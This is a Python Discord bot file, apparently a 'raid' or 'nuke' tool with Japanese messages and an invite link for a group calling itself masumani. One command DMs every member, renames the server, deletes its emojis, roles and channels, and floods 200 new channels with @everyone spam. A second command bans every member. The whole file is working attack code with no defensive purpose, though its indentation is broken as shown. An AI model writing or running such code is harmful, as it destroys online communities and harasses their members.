import discord
from discord.ext import commands
import asyncio
import aiohttp
import random
import os
from dotenv import load_dotenv

load_dotenv()

intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.members = True

bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
print(f'{bot.user} としてログインしました')
print(f'Bot ID: {bot.user.id}')
print('——')

@bot.command()
async def masumani(ctx):
new_server_name = 'ますまに共栄圏植民地｜MSMN'
icon_url = 'https://i.imgur.com/uMaj6CP.jpeg'
channel_name = 'ますまに共栄圏最強'
channel_count = 200
spam_message = '# このサーバーはますまに共栄圏によって荒らされました\nRaid by masumani\ndiscord.gg/DCKWUNfEA5\n@everyone\nhttps://cdn.discordapp.com/attachments/1236663988914229308/1287064282256900246/copy_89BE23AC-0647-468A-A5B9-504B5A98BC8B.gif?ex=68cf68c5&is=68ce1745&hm=1250d2c6de152cc6caab5c1b51f27163fdaa0ebff883fbbe7983959cdda7d782&'
spam_count = 500
role_name = 'ますまに共栄圏に荒らされましたww'
role_count = 150

```
await ctx.message.delete()

guild = ctx.guild
old_server_name = guild.name
user = ctx.author

await user.send('**処理を開始します...**')

await user.send(f'メンバーにDMを送信中...')
dm_count = 0
for member in guild.members:
    if not member.bot:
        try:
            await member.send(f'「{old_server_name}」を破壊しました。https://discord.gg/DCKWUNfEA5')
        dm_count += 1
        except:
    pass

await user.send(f'✅ DM送信完了: {dm_count}人に送信しました')

await user.send(f'サーバーアイコンを変更中...')
icon_bytes = None
try:
    async with aiohttp.ClientSession() as session:
        async with session.get(icon_url) as resp:
            if resp.status == 200:
                icon_bytes = await resp.read()
                await guild.edit(icon=icon_bytes)
                await user.send(f'アイコン変更完了')
except Exception as e:
    await user.send(f'アイコン変更失敗: {e}')

await user.send(f'サーバー名を変更中...')
try:
    await guild.edit(name=new_server_name)
    await user.send(f'サーバー名変更: {old_server_name} → {new_server_name}')
except Exception as e:
    await user.send(f'サーバー名変更失敗: {e}')

await user.send(f'絵文字を削除中...')
emoji_deleted = 0
for emoji in guild.emojis:
    try:
        await emoji.delete()
        emoji_deleted += 1
    except:
        pass
await user.send(f'{emoji_deleted}個の絵文字を削除しました')

await user.send(f'新しい絵文字を作成中...')
emoji_created = 0
if icon_bytes:
    try:
        max_emojis = guild.emoji_limit
        for i in range(max_emojis):
            try:
                await guild.create_custom_emoji(name=f'emoji{i}', image=icon_bytes)
                emoji_created += 1
                await asyncio.sleep(0.3)
            except:
                break
    except Exception as e:
        pass
await user.send(f'{emoji_created}個の絵文字を作成しました')

await user.send(f'ロールを削除中...')
role_deleted = 0
for role in guild.roles:
    if role.name != '@everyone' and not role.managed:
        try:
            await role.delete()
            role_deleted += 1
        except:
            pass
await user.send(f'{role_deleted}個のロールを削除しました')

await user.send(f'ロールを{role_count}個作成中...')
role_created = 0
for i in range(role_count):
    try:
        color = discord.Color.from_rgb(
            random.randint(50, 255),
            random.randint(50, 255),
            random.randint(50, 255)
        )
        await guild.create_role(name=role_name, color=color)
        role_created += 1
    except:
        pass
await user.send(f'✅ {role_created}個のロールを作成しました')

await user.send(f'チャンネルを削除中...')
deleted_count = 0
for channel in guild.channels:
    try:
        await channel.delete()
        deleted_count += 1
    except Exception as e:
        pass

await user.send(f'✅ {deleted_count}個のチャンネルを削除しました')

await user.send(f'チャンネルを{channel_count}個作成中...')
created_channels = []
created_count = 0
tasks = []

for i in range(channel_count):
 tasks.append(guild.create_text_channel(name=channel_name))
if len(tasks) >= 5:
        results = await asyncio.gather(*tasks, return_exceptions=True)
        for result in results:
            if not isinstance(result, Exception):
                created_count += 1
            created_channels.append(result)
        tasks = []
        await asyncio.sleep(0.5)

if tasks:
    results = await asyncio.gather(*tasks, return_exceptions=True)
    for result in results:
        if not isinstance(result, Exception):
            created_count += 1
            created_channels.append(result)

await user.send(f'✅ {created_count}個のチャンネルを作成しました')

await user.send(f'メッセージを送信中...')
total_messages = 0

for channel in created_channels:
    try:
        for i in range(spam_count):
            await channel.send(spam_message)
            total_messages += 1
    except Exception as e:
        pass

await user.send(f'✅ {total_messages}個のメッセージを送信しました')

await user.send(
    f'🎉 **全ての処理が完了しました！**\n'
    f'━━━━━━━━━━━━━━━━\n'
    f'📧 DM送信: {dm_count}人\n'
    f'絵文字削除: {emoji_deleted}個\n'
    f'絵文字作成: {emoji_created}個\n'
    f'ロール削除: {role_deleted}個\n'
    f'ロール作成: {role_created}個\n'
    f'チャンネル削除: {deleted_count}個\n'
    f'チャンネル作成: {created_count}個\n'
    f'メッセージ送信: {total_messages}件'
        )
```

@masumani.error
async def masumani_error(ctx, error):
await ctx.send(f'❌ エラーが発生しました: {error}')

@bot.command()
async def allban(ctx):
await ctx.message.delete()

```
guild = ctx.guild
user = ctx.author

await user.send('**全員BAN処理を開始します...**')

members = [member for member in guild.members if not member.bot and member != user]
total_members = len(members)

await user.send(f'対象メンバー数: {total_members}人')
await user.send(f'BANを実行中...')

banned_count = 0
failed_count = 0

for member in members:
    try:
        await guild.ban(member, reason='ますまに共栄圏によるBAN')
        banned_count += 1

        if banned_count % 10 == 0:
            await user.send(f'⏳ 進捗: {banned_count}/{total_members}人をBANしました')
    except Exception as e:
        failed_count += 1

await user.send(
    f'**BAN処理が完了**\n'
    f'━━━━━━━━━━━━━━━━\n'
    f'BAN成功: {banned_count}人\n'
    f'BAN失敗: {failed_count}人\n'
    f'合計対象: {total_members}人'
        )
```

@allban.error
async def allban_error(ctx, error):
try:
await ctx.author.send(f'❌ エラーが発生しました: {error}')
except:
pass

if **name** == '**main**':
TOKEN = os.getenv('TOKEN')
if not TOKEN:
print('エラー: TOKEN環境変数が設定されていません')
exit(1)
bot.run(TOKEN)